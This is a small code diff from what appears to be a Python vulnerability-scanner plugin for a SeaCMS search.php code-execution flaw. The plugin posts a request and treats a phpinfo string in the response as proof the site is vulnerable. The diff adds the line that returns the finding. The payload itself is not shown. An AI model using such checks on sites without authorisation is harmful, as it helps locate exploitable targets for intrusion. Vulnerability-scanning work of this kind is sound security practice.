@@ -28,6 +28,7 @@ class seacms_search_jq_code_exec_BaseVerify:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"Configuration File (php.ini) Path" in req.text:
                 cprint("[+]存在seacms search.php 参数jq代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return True, vulnurl, "seacms search.php 参数jq代码执行", str(post_data), req.text
             else:
                 cprint("[-]不存在seacms_search_jq_code_exec漏洞", "white", "on_grey")
                 return False, None, None, None, None
